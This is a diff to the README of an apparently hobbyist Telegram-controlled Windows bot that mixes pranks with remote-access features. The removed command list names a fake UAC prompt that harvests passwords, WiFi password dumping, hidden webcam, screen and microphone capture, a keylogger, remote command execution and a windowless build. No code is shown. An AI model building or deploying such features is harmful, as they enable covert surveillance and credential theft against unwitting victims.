@@ -3,95 +3,7 @@ Remote Control Bot, inspired to the previous creation named "Peppino", this one 
 (only tested on Windows10/11)
 
 ```/help: 
-🏠 Main Menu
-mainmenu - Shows main menu.
-🛑 System & Shutdown
-fakeuac - Fake UAC prompt, sends password.
-shutdown - Power off PC.
-fakeshutdown - Fake shutdown sequence.
-altf4 - Press Alt+F4.
-clear - Clean windows, webcam, temp files.
-selfdestruction - Remove program permanently.
-🌐 Network & Remote Access
-wifiinfo - Show saved WiFi passwords.
-getip - Get public IP and location.
-📸 Camera & Screen
-selfie - Take webcam photo.
-screenshot - Capture screen.
-fullclip - Record screen + webcam.
-webcamclip - Record webcam only.
-screenclip - Record screen only.
-recordjum - Record 20s jumpscare reaction.
-waitforface - Send photo when face detected.
-displaymode - Change display settings.
-webcamstreamstart - Start webcam stream.
-screenstreamstart - Start screen stream.
-webcamstreamstop - Stop webcam stream.
-screenstreamstop - Stop screen stream.
-webcamandscreenstreamstart - Both streams.
-webcamandscreenstreamstop - Stop both streams.
-🔊 Audio & Volume
-urltoast - Windows toast with URL.
-breath - Play breathing sound.
-pss - Play "psst" sound.
-fart - Play fart sound.
-playrandomnoise - Play static/interference.
-knockknock - Play door knocking.
-microphone - Record audio from mic.
-mutevolume - Mute system.
-fullvolume - Max volume.
-setvolume - Set volume level.
-getvolume - Check current volume.
-tralalerotralala - Play Italian brainrot.
-mixermenu - Audio controls menu.
-playfromurl - Play audio from URL.
-😈 Pranks & Visuals
-jumpscare - Random jumpscare.
-jumpscarenoaudio - Jumpscare without sound.
-invertedscreen - Invert screen colors.
-distortedscreen - Distort screen image.
-messagebox - Custom message box.
-messagespam - Spam message boxes.
-camerawallpaper - Webcam as wallpaper.
-setvideowallpaper - Video as wallpaper.
-hdmi_drowning_effect - Noise overlay.
-stop_hdmi_drowning_effect - Stop overlay.
-disturbed_overlay_and_random_noise - Noise overlay + audio.
-💻 System Control
-execute - Run system command.
-processkiller - Kill process from list.
-terminateprocess - Kill process by name.
-procmonmenu - Process monitor menu.
-procmonadd - Add to process monitor.
-procmonrem - Remove from process monitor.
-cmdsession - Open CMD session.
-🎮 Input / Device Control
-randomkeyboard - Randomize keyboard input.
-capslock - Toggle Caps Lock.
-mousecontroller - Mouse control menu.
-mouselock - Lock mouse position.
-setMouseJump - Set mouse movement distance.
-📋 Messaging
-bsend - Send text message.
-id - Get chat ID.
-deletemessages - Delete last N messages.
-deleteallmessages - Delete all messages.
-🔒 Can't Open List
-cantopenadd - Block process.
-cantopenremove - Unblock process.
-cantopenmenu - View blocked processes.
-🧠 Keylogger
-keylogger - Log keystrokes to file.
-livekeylogger - Live keystroke updates.
-🦑 Misc
-plankton - Plankton jumpscare.
-planktonnoaudio - Plankton without audio.
-johnpork - John Pork jumpscare.
-johnporknoaudio - John Pork without audio.
-gabinetti - Gabinetti meme.
-duckyscript - Run DuckyScript.
-duckyhelp - DuckyScript commands.
-browser - Open URL.
+See [Commands](docs/COMMANDS.md)
 📎 File Input Commands
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
@@ -150,6 +62,7 @@ nuitka pep2.py --standalone --windows-console-mode=disable --onefile --follow-im
 ```
 ## 🧩 Plugin System
 RCPepTelegram supports **class-based plugins** that integrate directly with the bot, UI, and messaging system.
+Make sure to check [Plugins](docs/PLUGINS.md)
 ### 📁 Plugin Structure
 
 ```
